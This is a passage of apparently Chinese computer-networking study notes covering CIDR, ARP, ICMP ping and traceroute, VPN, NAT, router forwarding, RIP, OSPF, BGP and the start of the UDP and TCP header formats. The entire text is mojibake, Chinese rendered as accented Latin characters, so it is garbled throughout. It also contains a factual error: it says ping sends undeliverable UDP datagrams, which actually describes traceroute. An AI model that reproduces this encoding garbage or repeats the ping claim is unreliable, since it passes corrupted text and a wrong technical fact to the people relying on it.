ç±»åœ°å€çš„é»˜è®¤å­ç½‘æ©ç ä¸º 255.255.0.0ï¼Œå¦‚æœ B ç±»åœ°å€çš„å­ç½‘å ä¸¤ä¸ªæ¯”ç‰¹ï¼Œé‚£ä¹ˆå­ç½‘æ©ç ä¸º 11111111 11111111 11000000 00000000ï¼Œä¹Ÿå°±æ˜¯ 255.255.192.0ã€‚ 3. æ— åˆ†ç±»æ— åˆ†ç±»ç¼–å€ CIDR æ¶ˆé™¤äº†ä¼ ç»Ÿ A ç±»ã€B ç±»å’Œ C ç±»åœ°å€ä»¥åŠåˆ’åˆ†å­ç½‘çš„æ¦‚å¿µï¼Œä½¿ç”¨ç½‘ç»œå‰ç¼€å’Œä¸»æœºå·æ¥å¯¹ IP åœ°å€è¿›è¡Œç¼–ç ï¼Œç½‘ç»œå‰ç¼€çš„é•¿åº¦å¯ä»¥æ ¹æ®éœ€è¦å˜åŒ–ã€‚ IP åœ°å€ ::= {&lt; ç½‘ç»œå‰ç¼€å· &gt;, &lt; ä¸»æœºå· &gt;} CIDR çš„è®°æ³•ä¸Šé‡‡ç”¨åœ¨ IP åœ°å€åé¢åŠ ä¸Šç½‘ç»œå‰ç¼€é•¿åº¦çš„æ–¹æ³•ï¼Œä¾‹å¦‚ 128.14.35.7/20 è¡¨ç¤ºå‰ 20 ä½ä¸ºç½‘ç»œå‰ç¼€ã€‚ CIDR çš„åœ°å€æ©ç å¯ä»¥ç»§ç»­ç§°ä¸ºå­ç½‘æ©ç ï¼Œå­ç½‘æ©ç é¦– 1 é•¿åº¦ä¸ºç½‘ç»œå‰ç¼€çš„é•¿åº¦ã€‚ ä¸€ä¸ª CIDR åœ°å€å—ä¸­æœ‰å¾ˆå¤šåœ°å€ï¼Œä¸€ä¸ª CIDR è¡¨ç¤ºçš„ç½‘ç»œå°±å¯ä»¥è¡¨ç¤ºåŸæ¥çš„å¾ˆå¤šä¸ªç½‘ç»œï¼Œå¹¶ä¸”åœ¨è·¯ç”±è¡¨ä¸­åªéœ€è¦ä¸€ä¸ªè·¯ç”±å°±å¯ä»¥ä»£æ›¿åŸæ¥çš„å¤šä¸ªè·¯ç”±ï¼Œå‡å°‘äº†è·¯ç”±è¡¨é¡¹çš„æ•°é‡ã€‚æŠŠè¿™ç§é€šè¿‡ä½¿ç”¨ç½‘ç»œå‰ç¼€æ¥å‡å°‘è·¯ç”±è¡¨é¡¹çš„æ–¹å¼ç§°ä¸ºè·¯ç”±èšåˆï¼Œä¹Ÿç§°ä¸º æ„æˆè¶…ç½‘ ã€‚ åœ¨è·¯ç”±è¡¨ä¸­çš„é¡¹ç›®ç”±â€œç½‘ç»œå‰ç¼€â€å’Œâ€œä¸‹ä¸€è·³åœ°å€â€ç»„æˆï¼Œåœ¨æŸ¥æ‰¾æ—¶å¯èƒ½ä¼šå¾—åˆ°ä¸æ­¢ä¸€ä¸ªåŒ¹é…ç»“æœï¼Œåº”å½“é‡‡ç”¨æœ€é•¿å‰ç¼€åŒ¹é…æ¥ç¡®å®šåº”è¯¥åŒ¹é…å“ªä¸€ä¸ªã€‚ åœ°å€è§£æåè®® ARPç½‘ç»œå±‚å®ç°ä¸»æœºä¹‹é—´çš„é€šä¿¡ï¼Œè€Œé“¾è·¯å±‚å®ç°å…·ä½“æ¯æ®µé“¾è·¯ä¹‹é—´çš„é€šä¿¡ã€‚å› æ­¤åœ¨é€šä¿¡è¿‡ç¨‹ä¸­ï¼ŒIP æ•°æ®æŠ¥çš„æºåœ°å€å’Œç›®çš„åœ°å€å§‹ç»ˆä¸å˜ï¼Œè€Œ MAC åœ°å€éšç€é“¾è·¯çš„æ”¹å˜è€Œæ”¹å˜ã€‚ ARP å®ç°ç”± IP åœ°å€å¾—åˆ° MAC åœ°å€ã€‚ æ¯ä¸ªä¸»æœºéƒ½æœ‰ä¸€ä¸ª ARP é«˜é€Ÿç¼“å­˜ï¼Œé‡Œé¢æœ‰æœ¬å±€åŸŸç½‘ä¸Šçš„å„ä¸»æœºå’Œè·¯ç”±å™¨çš„ IP åœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨ã€‚ å¦‚æœä¸»æœº A çŸ¥é“ä¸»æœº B çš„ IP åœ°å€ï¼Œä½†æ˜¯ ARP é«˜é€Ÿç¼“å­˜ä¸­æ²¡æœ‰è¯¥ IP åœ°å€åˆ° MAC åœ°å€çš„æ˜ å°„ï¼Œæ­¤æ—¶ä¸»æœº A é€šè¿‡å¹¿æ’­çš„æ–¹å¼å‘é€ ARP è¯·æ±‚åˆ†ç»„ï¼Œä¸»æœº B æ”¶åˆ°è¯¥è¯·æ±‚åä¼šå‘é€ ARP å“åº”åˆ†ç»„ç»™ä¸»æœº A å‘ŠçŸ¥å…¶ MAC åœ°å€ï¼Œéšåä¸»æœº A å‘å…¶é«˜é€Ÿç¼“å­˜ä¸­å†™å…¥ä¸»æœº B çš„ IP åœ°å€åˆ° MAC åœ°å€çš„æ˜ å°„ã€‚ ç½‘é™…æ§åˆ¶æŠ¥æ–‡åè®® ICMPICMP æ˜¯ä¸ºäº†æ›´æœ‰æ•ˆåœ°è½¬å‘ IP æ•°æ®æŠ¥å’Œæé«˜äº¤ä»˜æˆåŠŸçš„æœºä¼šã€‚å®ƒå°è£…åœ¨ IP æ•°æ®æŠ¥ä¸­ï¼Œä½†æ˜¯ä¸å±äºé«˜å±‚åè®®ã€‚ ICMP æŠ¥æ–‡åˆ†ä¸ºå·®é”™æŠ¥å‘ŠæŠ¥æ–‡å’Œè¯¢é—®æŠ¥æ–‡ã€‚ 1. PingPing æ˜¯ ICMP çš„ä¸€ä¸ªé‡è¦åº”ç”¨ï¼Œä¸»è¦ç”¨æ¥æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„è¿é€šæ€§ã€‚ Ping å‘é€çš„ IP æ•°æ®æŠ¥å°è£…çš„æ˜¯æ— æ³•äº¤ä»˜çš„ UDP ç”¨æˆ·æ•°æ®æŠ¥ã€‚ 2. TracerouteTraceroute æ˜¯ ICMP çš„å¦ä¸€ä¸ªåº”ç”¨ï¼Œç”¨æ¥è·Ÿè¸ªä¸€ä¸ªåˆ†ç»„ä»æºç‚¹åˆ°ç»ˆç‚¹çš„è·¯å¾„ã€‚ æºä¸»æœºå‘ç›®çš„ä¸»æœºå‘é€ä¸€è¿ä¸²çš„ IP æ•°æ®æŠ¥ã€‚ç¬¬ä¸€ä¸ªæ•°æ®æŠ¥ P1 çš„ç”Ÿå­˜æ—¶é—´ TTL è®¾ç½®ä¸º 1ï¼Œå½“ P1 åˆ°è¾¾è·¯å¾„ä¸Šçš„ç¬¬ä¸€ä¸ªè·¯ç”±å™¨ R1 æ—¶ï¼ŒR1 æ”¶ä¸‹å®ƒå¹¶æŠŠ TTL å‡ 1ï¼Œæ­¤æ—¶ TTL ç­‰äº 0ï¼ŒR1 å°±æŠŠ P1 ä¸¢å¼ƒï¼Œå¹¶å‘æºä¸»æœºå‘é€ä¸€ä¸ª ICMP æ—¶é—´è¶…è¿‡å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ï¼› æºä¸»æœºæ¥ç€å‘é€ç¬¬äºŒä¸ªæ•°æ®æŠ¥ P2ï¼Œå¹¶æŠŠ TTL è®¾ç½®ä¸º 2ã€‚P2 å…ˆåˆ°è¾¾ R1ï¼ŒR1 æ”¶ä¸‹åæŠŠ TTL å‡ 1 å†è½¬å‘ç»™ R2ï¼ŒR2 æ”¶ä¸‹åä¹ŸæŠŠ TTL å‡ 1ï¼Œç”±äºæ­¤æ—¶ TTL ç­‰äº 0ï¼ŒR2 å°±ä¸¢å¼ƒ P2ï¼Œå¹¶å‘æºä¸»æœºå‘é€ä¸€ä¸ª ICMP æ—¶é—´è¶…è¿‡å·®é”™æŠ¥æ–‡ã€‚ ä¸æ–­æ‰§è¡Œè¿™æ ·çš„æ­¥éª¤ï¼Œç›´åˆ°æœ€åä¸€ä¸ªæ•°æ®æŠ¥åˆšåˆšåˆ°è¾¾ç›®çš„ä¸»æœºï¼Œä¸»æœºä¸è½¬å‘æ•°æ®æŠ¥ï¼Œä¹Ÿä¸æŠŠ TTL å€¼å‡ 1ã€‚ä½†æ˜¯å› ä¸ºæ•°æ®æŠ¥å°è£…çš„æ˜¯æ— æ³•äº¤ä»˜çš„ UDPï¼Œå› æ­¤ç›®çš„ä¸»æœºè¦å‘æºä¸»æœºå‘é€ ICMP ç»ˆç‚¹ä¸å¯è¾¾å·®é”™æŠ¥å‘ŠæŠ¥æ–‡ã€‚ ä¹‹åæºä¸»æœºçŸ¥é“äº†åˆ°è¾¾ç›®çš„ä¸»æœºæ‰€ç»è¿‡çš„è·¯ç”±å™¨ IP åœ°å€ä»¥åŠåˆ°è¾¾æ¯ä¸ªè·¯ç”±å™¨çš„å¾€è¿”æ—¶é—´ã€‚ è™šæ‹Ÿä¸“ç”¨ç½‘ VPNç”±äº IP åœ°å€çš„ç´§ç¼ºï¼Œä¸€ä¸ªæœºæ„èƒ½ç”³è¯·åˆ°çš„ IP åœ°å€æ•°å¾€å¾€è¿œå°äºæœ¬æœºæ„æ‰€æ‹¥æœ‰çš„ä¸»æœºæ•°ã€‚å¹¶ä¸”ä¸€ä¸ªæœºæ„å¹¶ä¸éœ€è¦æŠŠæ‰€æœ‰çš„ä¸»æœºæ¥å…¥åˆ°å¤–éƒ¨çš„äº’è”ç½‘ä¸­ï¼Œæœºæ„å†…çš„è®¡ç®—æœºå¯ä»¥ä½¿ç”¨ä»…åœ¨æœ¬æœºæ„æœ‰æ•ˆçš„ IP åœ°å€ï¼ˆä¸“ç”¨åœ°å€ï¼‰ã€‚ æœ‰ä¸‰ä¸ªä¸“ç”¨åœ°å€å—ï¼š 10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN ä½¿ç”¨å…¬ç”¨çš„äº’è”ç½‘ä½œä¸ºæœ¬æœºæ„å„ä¸“ç”¨ç½‘ä¹‹é—´çš„é€šä¿¡è½½ä½“ã€‚ä¸“ç”¨æŒ‡æœºæ„å†…çš„ä¸»æœºåªä¸æœ¬æœºæ„å†…çš„å…¶å®ƒä¸»æœºé€šä¿¡ï¼›è™šæ‹ŸæŒ‡â€œå¥½åƒæ˜¯â€ï¼Œè€Œå®é™…ä¸Šå¹¶ä¸æ˜¯ï¼Œå®ƒæœ‰ç»è¿‡å…¬ç”¨çš„äº’è”ç½‘ã€‚ ä¸‹å›¾ä¸­ï¼Œåœºæ‰€ A å’Œ B çš„é€šä¿¡ç»è¿‡äº’è”ç½‘ï¼Œå¦‚æœåœºæ‰€ A çš„ä¸»æœº X è¦å’Œå¦ä¸€ä¸ªåœºæ‰€ B çš„ä¸»æœº Y é€šä¿¡ï¼ŒIP æ•°æ®æŠ¥çš„æºåœ°å€æ˜¯ 10.1.0.1ï¼Œç›®çš„åœ°å€æ˜¯ 10.2.0.3ã€‚æ•°æ®æŠ¥å…ˆå‘é€åˆ°ä¸äº’è”ç½‘ç›¸è¿çš„è·¯ç”±å™¨ R1ï¼ŒR1 å¯¹å†…éƒ¨æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Œç„¶åé‡æ–°åŠ ä¸Šæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œæºåœ°å€æ˜¯è·¯ç”±å™¨ R1 çš„å…¨çƒåœ°å€ 125.1.2.3ï¼Œç›®çš„åœ°å€æ˜¯è·¯ç”±å™¨ R2 çš„å…¨çƒåœ°å€ 194.4.5.6ã€‚è·¯ç”±å™¨ R2 æ”¶åˆ°æ•°æ®æŠ¥åå°†æ•°æ®éƒ¨åˆ†è¿›è¡Œè§£å¯†ï¼Œæ¢å¤åŸæ¥çš„æ•°æ®æŠ¥ï¼Œæ­¤æ—¶ç›®çš„åœ°å€ä¸º 10.2.0.3ï¼Œå°±äº¤ä»˜ç»™ Yã€‚ ç½‘ç»œåœ°å€è½¬æ¢ NATä¸“ç”¨ç½‘å†…éƒ¨çš„ä¸»æœºä½¿ç”¨æœ¬åœ° IP åœ°å€åˆæƒ³å’Œäº’è”ç½‘ä¸Šçš„ä¸»æœºé€šä¿¡æ—¶ï¼Œå¯ä»¥ä½¿ç”¨ NAT æ¥å°†æœ¬åœ° IP è½¬æ¢ä¸ºå…¨çƒ IPã€‚ åœ¨ä»¥å‰ï¼ŒNAT å°†æœ¬åœ° IP å’Œå…¨çƒ IP ä¸€ä¸€å¯¹åº”ï¼Œè¿™ç§æ–¹å¼ä¸‹æ‹¥æœ‰ n ä¸ªå…¨çƒ IP åœ°å€çš„ä¸“ç”¨ç½‘å†…æœ€å¤šåªå¯ä»¥åŒæ—¶æœ‰ n å°ä¸»æœºæ¥å…¥äº’è”ç½‘ã€‚ä¸ºäº†æ›´æœ‰æ•ˆåœ°åˆ©ç”¨å…¨çƒ IP åœ°å€ï¼Œç°åœ¨å¸¸ç”¨çš„ NAT è½¬æ¢è¡¨æŠŠè¿è¾“å±‚çš„ç«¯å£å·ä¹Ÿç”¨ä¸Šäº†ï¼Œä½¿å¾—å¤šä¸ªä¸“ç”¨ç½‘å†…éƒ¨çš„ä¸»æœºå…±ç”¨ä¸€ä¸ªå…¨çƒ IP åœ°å€ã€‚ä½¿ç”¨ç«¯å£å·çš„ NAT ä¹Ÿå«åšç½‘ç»œåœ°å€ä¸ç«¯å£è½¬æ¢ NAPTã€‚ è·¯ç”±å™¨çš„ç»“æ„è·¯ç”±å™¨ä»åŠŸèƒ½ä¸Šå¯ä»¥åˆ’åˆ†ä¸ºï¼šè·¯ç”±é€‰æ‹©å’Œåˆ†ç»„è½¬å‘ã€‚ åˆ†ç»„è½¬å‘ç»“æ„ç”±ä¸‰ä¸ªéƒ¨åˆ†ç»„æˆï¼šäº¤æ¢ç»“æ„ã€ä¸€ç»„è¾“å…¥ç«¯å£å’Œä¸€ç»„è¾“å‡ºç«¯å£ã€‚ è·¯ç”±å™¨åˆ†ç»„è½¬å‘æµç¨‹ ä»æ•°æ®æŠ¥çš„é¦–éƒ¨æå–ç›®çš„ä¸»æœºçš„ IP åœ°å€ Dï¼Œå¾—åˆ°ç›®çš„ç½‘ç»œåœ°å€ Nã€‚ è‹¥ N å°±æ˜¯ä¸æ­¤è·¯ç”±å™¨ç›´æ¥ç›¸è¿çš„æŸä¸ªç½‘ç»œåœ°å€ï¼Œåˆ™è¿›è¡Œç›´æ¥äº¤ä»˜ï¼› è‹¥è·¯ç”±è¡¨ä¸­æœ‰ç›®çš„åœ°å€ä¸º D çš„ç‰¹å®šä¸»æœºè·¯ç”±ï¼Œåˆ™æŠŠæ•°æ®æŠ¥ä¼ é€ç»™è¡¨ä¸­æ‰€æŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ï¼› è‹¥è·¯ç”±è¡¨ä¸­æœ‰åˆ°è¾¾ç½‘ç»œ N çš„è·¯ç”±ï¼Œåˆ™æŠŠæ•°æ®æŠ¥ä¼ é€ç»™è·¯ç”±è¡¨ä¸­æ‰€æŒ‡æ˜çš„ä¸‹ä¸€è·³è·¯ç”±å™¨ï¼› è‹¥è·¯ç”±è¡¨ä¸­æœ‰ä¸€ä¸ªé»˜è®¤è·¯ç”±ï¼Œåˆ™æŠŠæ•°æ®æŠ¥ä¼ é€ç»™è·¯ç”±è¡¨ä¸­æ‰€æŒ‡æ˜çš„é»˜è®¤è·¯ç”±å™¨ï¼› æŠ¥å‘Šè½¬å‘åˆ†ç»„å‡ºé”™ã€‚ è·¯ç”±é€‰æ‹©åè®®è·¯ç”±é€‰æ‹©åè®®éƒ½æ˜¯è‡ªé€‚åº”çš„ï¼Œèƒ½éšç€ç½‘ç»œé€šä¿¡é‡å’Œæ‹“æ‰‘ç»“æ„çš„å˜åŒ–è€Œè‡ªé€‚åº”åœ°è¿›è¡Œè°ƒæ•´ã€‚ äº’è”ç½‘å¯ä»¥åˆ’åˆ†ä¸ºè®¸å¤šè¾ƒå°çš„è‡ªæ²»ç³»ç»Ÿ ASï¼Œä¸€ä¸ª AS å¯ä»¥ä½¿ç”¨ä¸€ç§å’Œåˆ«çš„ AS ä¸åŒçš„è·¯ç”±é€‰æ‹©åè®®ã€‚ å¯ä»¥æŠŠè·¯ç”±é€‰æ‹©åè®®åˆ’åˆ†ä¸ºä¸¤å¤§ç±»ï¼š è‡ªæ²»ç³»ç»Ÿå†…éƒ¨çš„è·¯ç”±é€‰æ‹©ï¼šRIP å’Œ OSPF è‡ªæ²»ç³»ç»Ÿé—´çš„è·¯ç”±é€‰æ‹©ï¼šBGP 1. å†…éƒ¨ç½‘å…³åè®® RIPRIP æ˜¯ä¸€ç§åŸºäºè·ç¦»å‘é‡çš„è·¯ç”±é€‰æ‹©åè®®ã€‚è·ç¦»æ˜¯æŒ‡è·³æ•°ï¼Œç›´æ¥ç›¸è¿çš„è·¯ç”±å™¨è·³æ•°ä¸º 1ï¼Œè·³æ•°æœ€å¤šä¸º 15ï¼Œè¶…è¿‡ 15 è¡¨ç¤ºä¸å¯è¾¾ã€‚ RIP æŒ‰å›ºå®šçš„æ—¶é—´é—´éš”ä»…å’Œç›¸é‚»è·¯ç”±å™¨äº¤æ¢è‡ªå·±çš„è·¯ç”±è¡¨ï¼Œç»è¿‡è‹¥å¹²æ¬¡äº¤æ¢ä¹‹åï¼Œæ‰€æœ‰è·¯ç”±å™¨æœ€ç»ˆä¼šçŸ¥é“åˆ°è¾¾æœ¬è‡ªæ²»ç³»ç»Ÿä¸­ä»»ä½•ä¸€ä¸ªç½‘ç»œçš„æœ€çŸ­è·ç¦»å’Œä¸‹ä¸€è·³è·¯ç”±å™¨åœ°å€ã€‚ è·ç¦»å‘é‡ç®—æ³•ï¼š å¯¹åœ°å€ä¸º X çš„ç›¸é‚»è·¯ç”±å™¨å‘æ¥çš„ RIP æŠ¥æ–‡ï¼Œå…ˆä¿®æ”¹æŠ¥æ–‡ä¸­çš„æ‰€æœ‰é¡¹ç›®ï¼ŒæŠŠä¸‹ä¸€è·³å­—æ®µä¸­çš„åœ°å€æ”¹ä¸º Xï¼Œå¹¶æŠŠæ‰€æœ‰çš„è·ç¦»å­—æ®µåŠ  1ï¼› å¯¹ä¿®æ”¹åçš„ RIP æŠ¥æ–‡ä¸­çš„æ¯ä¸€ä¸ªé¡¹ç›®ï¼Œè¿›è¡Œä»¥ä¸‹æ­¥éª¤ï¼š è‹¥åŸæ¥çš„è·¯ç”±è¡¨ä¸­æ²¡æœ‰ç›®çš„ç½‘ç»œ Nï¼Œåˆ™æŠŠè¯¥é¡¹ç›®æ·»åŠ åˆ°è·¯ç”±è¡¨ä¸­ï¼› å¦åˆ™ï¼šè‹¥ä¸‹ä¸€è·³è·¯ç”±å™¨åœ°å€æ˜¯ Xï¼Œåˆ™æŠŠæ”¶åˆ°çš„é¡¹ç›®æ›¿æ¢åŸæ¥è·¯ç”±è¡¨ä¸­çš„é¡¹ç›®ï¼›å¦åˆ™ï¼šè‹¥æ”¶åˆ°çš„é¡¹ç›®ä¸­çš„è·ç¦» d å°äºè·¯ç”±è¡¨ä¸­çš„è·ç¦»ï¼Œåˆ™è¿›è¡Œæ›´æ–°ï¼ˆä¾‹å¦‚åŸå§‹è·¯ç”±è¡¨é¡¹ä¸º Net2, 5, Pï¼Œæ–°è¡¨é¡¹ä¸º Net2, 4, Xï¼Œåˆ™æ›´æ–°ï¼‰ï¼›å¦åˆ™ä»€ä¹ˆä¹Ÿä¸åšã€‚ è‹¥ 3 åˆ†é’Ÿè¿˜æ²¡æœ‰æ”¶åˆ°ç›¸é‚»è·¯ç”±å™¨çš„æ›´æ–°è·¯ç”±è¡¨ï¼Œåˆ™æŠŠè¯¥ç›¸é‚»è·¯ç”±å™¨æ ‡ä¸ºä¸å¯è¾¾ï¼Œå³æŠŠè·ç¦»ç½®ä¸º 16ã€‚ RIP åè®®å®ç°ç®€å•ï¼Œå¼€é”€å°ã€‚ä½†æ˜¯ RIP èƒ½ä½¿ç”¨çš„æœ€å¤§è·ç¦»ä¸º 15ï¼Œé™åˆ¶äº†ç½‘ç»œçš„è§„æ¨¡ã€‚å¹¶ä¸”å½“ç½‘ç»œå‡ºç°æ•…éšœæ—¶ï¼Œè¦ç»è¿‡æ¯”è¾ƒé•¿çš„æ—¶é—´æ‰èƒ½å°†æ­¤æ¶ˆæ¯ä¼ é€åˆ°æ‰€æœ‰è·¯ç”±å™¨ã€‚ 2. å†…éƒ¨ç½‘å…³åè®® OSPFå¼€æ”¾æœ€çŸ­è·¯å¾„ä¼˜å…ˆ OSPFï¼Œæ˜¯ä¸ºäº†å…‹æœ RIP çš„ç¼ºç‚¹è€Œå¼€å‘å‡ºæ¥çš„ã€‚ å¼€æ”¾è¡¨ç¤º OSPF ä¸å—æŸä¸€å®¶å‚å•†æ§åˆ¶ï¼Œè€Œæ˜¯å…¬å¼€å‘è¡¨çš„ï¼›æœ€çŸ­è·¯å¾„ä¼˜å…ˆè¡¨ç¤ºä½¿ç”¨äº† Dijkstra æå‡ºçš„æœ€çŸ­è·¯å¾„ç®—æ³• SPFã€‚ OSPF å…·æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å‘æœ¬è‡ªæ²»ç³»ç»Ÿä¸­çš„æ‰€æœ‰è·¯ç”±å™¨å‘é€ä¿¡æ¯ï¼Œè¿™ç§æ–¹æ³•æ˜¯æ´ªæ³›æ³•ã€‚ å‘é€çš„ä¿¡æ¯å°±æ˜¯ä¸ç›¸é‚»è·¯ç”±å™¨çš„é“¾è·¯çŠ¶æ€ï¼Œé“¾è·¯çŠ¶æ€åŒ…æ‹¬ä¸å“ªäº›è·¯ç”±å™¨ç›¸è¿ä»¥åŠé“¾è·¯çš„åº¦é‡ï¼Œåº¦é‡ç”¨è´¹ç”¨ã€è·ç¦»ã€æ—¶å»¶ã€å¸¦å®½ç­‰æ¥è¡¨ç¤ºã€‚ åªæœ‰å½“é“¾è·¯çŠ¶æ€å‘ç”Ÿå˜åŒ–æ—¶ï¼Œè·¯ç”±å™¨æ‰ä¼šå‘é€ä¿¡æ¯ã€‚ æ‰€æœ‰è·¯ç”±å™¨éƒ½å…·æœ‰å…¨ç½‘çš„æ‹“æ‰‘ç»“æ„å›¾ï¼Œå¹¶ä¸”æ˜¯ä¸€è‡´çš„ã€‚ç›¸æ¯”äº RIPï¼ŒOSPF çš„æ›´æ–°è¿‡ç¨‹æ”¶æ•›çš„å¾ˆå¿«ã€‚ 3. å¤–éƒ¨ç½‘å…³åè®® BGPBGPï¼ˆBorder Gateway Protocolï¼Œè¾¹ç•Œç½‘å…³åè®®ï¼‰ AS ä¹‹é—´çš„è·¯ç”±é€‰æ‹©å¾ˆå›°éš¾ï¼Œä¸»è¦æ˜¯å› ä¸ºäº’è”ç½‘è§„æ¨¡å¾ˆå¤§ã€‚å¹¶ä¸”å„ä¸ª AS å†…éƒ¨ä½¿ç”¨ä¸åŒçš„è·¯ç”±é€‰æ‹©åè®®ï¼Œå°±æ— æ³•å‡†ç¡®å®šä¹‰è·¯å¾„çš„åº¦é‡ã€‚å¹¶ä¸” AS ä¹‹é—´çš„è·¯ç”±é€‰æ‹©å¿…é¡»è€ƒè™‘æœ‰å…³çš„ç­–ç•¥ï¼Œæ¯”å¦‚æœ‰äº› AS ä¸æ„¿æ„è®©å…¶å®ƒ AS ç»è¿‡ã€‚ BGP åªèƒ½å¯»æ‰¾ä¸€æ¡æ¯”è¾ƒå¥½çš„è·¯ç”±ï¼Œè€Œä¸æ˜¯æœ€ä½³è·¯ç”±ã€‚ æ¯ä¸ª AS éƒ½å¿…é¡»é…ç½® BGP å‘è¨€äººï¼Œé€šè¿‡åœ¨ä¸¤ä¸ªç›¸é‚» BGP å‘è¨€äººä¹‹é—´å»ºç«‹ TCP è¿æ¥æ¥äº¤æ¢è·¯ç”±ä¿¡æ¯ã€‚ äº”ã€è¿è¾“å±‚*ç½‘ç»œå±‚åªæŠŠåˆ†ç»„å‘é€åˆ°ç›®çš„ä¸»æœºï¼Œä½†æ˜¯çœŸæ­£é€šä¿¡çš„å¹¶ä¸æ˜¯ä¸»æœºè€Œæ˜¯ä¸»æœºä¸­çš„è¿›ç¨‹ã€‚è¿è¾“å±‚æä¾›äº†è¿›ç¨‹é—´çš„é€»è¾‘é€šä¿¡ï¼Œè¿è¾“å±‚å‘é«˜å±‚ç”¨æˆ·å±è”½äº†ä¸‹é¢ç½‘ç»œå±‚çš„æ ¸å¿ƒç»†èŠ‚ï¼Œä½¿åº”ç”¨ç¨‹åºçœ‹èµ·æ¥åƒæ˜¯åœ¨ä¸¤ä¸ªè¿è¾“å±‚å®ä½“ä¹‹é—´æœ‰ä¸€æ¡ç«¯åˆ°ç«¯çš„é€»è¾‘é€šä¿¡ä¿¡é“ã€‚ UDP å’Œ TCP çš„ç‰¹ç‚¹ ç”¨æˆ·æ•°æ®æŠ¥åè®® UDPï¼ˆUser Datagram Protocolï¼‰æ˜¯æ— è¿æ¥çš„ï¼Œå°½æœ€å¤§å¯èƒ½äº¤ä»˜ï¼Œæ²¡æœ‰æ‹¥å¡æ§åˆ¶ï¼Œé¢å‘æŠ¥æ–‡ï¼ˆå¯¹äºåº”ç”¨ç¨‹åºä¼ ä¸‹æ¥çš„æŠ¥æ–‡ä¸åˆå¹¶ä¹Ÿä¸æ‹†åˆ†ï¼Œåªæ˜¯æ·»åŠ  UDP é¦–éƒ¨ï¼‰ï¼Œæ”¯æŒä¸€å¯¹ä¸€ã€ä¸€å¯¹å¤šã€å¤šå¯¹ä¸€å’Œå¤šå¯¹å¤šçš„äº¤äº’é€šä¿¡ã€‚ ä¼ è¾“æ§åˆ¶åè®® TCPï¼ˆTransmission Control Protocolï¼‰æ˜¯é¢å‘è¿æ¥çš„ï¼Œæä¾›å¯é äº¤ä»˜ï¼Œæœ‰æµé‡æ§åˆ¶ï¼Œæ‹¥å¡æ§åˆ¶ï¼Œæä¾›å…¨åŒå·¥é€šä¿¡ï¼Œé¢å‘å­—èŠ‚æµï¼ˆæŠŠåº”ç”¨å±‚ä¼ ä¸‹æ¥çš„æŠ¥æ–‡çœ‹æˆå­—èŠ‚æµï¼ŒæŠŠå­—èŠ‚æµç»„ç»‡æˆå¤§å°ä¸ç­‰çš„æ•°æ®å—ï¼‰ï¼Œæ¯ä¸€æ¡ TCP è¿æ¥åªèƒ½æ˜¯ç‚¹å¯¹ç‚¹çš„ï¼ˆä¸€å¯¹ä¸€ï¼‰ã€‚ UDP é¦–éƒ¨æ ¼å¼ é¦–éƒ¨å­—æ®µåªæœ‰ 8 ä¸ªå­—èŠ‚ï¼ŒåŒ…æ‹¬æºç«¯å£ã€ç›®çš„ç«¯å£ã€é•¿åº¦ã€æ£€éªŒå’Œã€‚12 å­—èŠ‚çš„ä¼ªé¦–éƒ¨æ˜¯ä¸ºäº†è®¡ç®—æ£€éªŒå’Œä¸´æ—¶æ·»åŠ çš„ã€‚ TCP é¦–éƒ¨æ ¼å¼ åºå· ï¼šç”¨äºå¯¹å­—èŠ‚æµè¿›è¡Œç¼–å·ï¼Œä¾‹å¦‚åºå·ä¸º 301ï¼Œè¡¨ç¤ºç¬¬ä¸€ä¸ªå­—èŠ‚çš„ç¼–å·ä¸º 301ï¼Œå¦‚æœæºå¸¦çš„æ•°æ®é•¿åº¦ä¸º 100 å­—èŠ‚ï¼Œé‚£ä¹ˆä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·åº”ä¸º 401ã€‚ ç¡®è®¤å· ï¼šæœŸæœ›æ”¶åˆ°çš„ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·ã€‚ä¾‹å¦‚ B æ­£ç¡®æ”¶åˆ° A å‘é€æ¥çš„ä¸€ä¸ªæŠ¥æ–‡æ®µï¼Œåºå·ä¸º 501ï¼Œæºå¸¦çš„æ•°æ®é•¿åº¦ä¸º 200 å­—èŠ‚ï¼Œå› æ­¤ B æœŸæœ›ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·ä¸º 701ï¼ŒB å‘é€ç»™ A çš„ç¡®è®¤æŠ¥æ–‡æ®µä¸­ç¡®è®¤å·å°±ä¸º 701ã€‚ æ•°æ®åç§» ï¼šæŒ‡çš„æ˜¯æ•°æ®éƒ¨åˆ†è·ç¦»æŠ¥æ–‡æ®µèµ·å§‹å¤„çš„åç§»é‡ï¼Œå®é™…ä¸ŠæŒ‡çš„æ˜¯é¦–éƒ¨çš„é•¿åº¦ã€‚ ç¡®è®¤ ACK ï¼šå½“ ACK=1 æ—¶ç¡®è®¤å·å­—æ®µæœ‰æ•ˆï¼Œå¦åˆ™æ— æ•ˆã€‚TCP è§„å®šï¼Œåœ¨è¿æ¥å»ºç«‹åæ‰€æœ‰ä¼ é€çš„æŠ¥æ–‡æ®µéƒ½å¿…é¡»æŠŠ ACK ç½® 1ã€‚ åŒæ­¥ SYN ï¼šåœ¨è¿æ¥å»ºç«‹æ—¶ç”¨æ¥åŒæ­¥åºå·ã€‚å½“ SYN=1ï¼ŒACK=0 æ—¶è¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªè¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µã€‚è‹¥å¯¹æ–¹åŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å“åº”æŠ¥æ–‡ä¸­ SYN=1ï¼ŒACK=1ã€‚ ç»ˆæ­¢ FIN ï¼šç”¨æ¥é‡Šæ”¾ä¸€ä¸ªè¿æ¥ï¼Œå½“ FIN=1 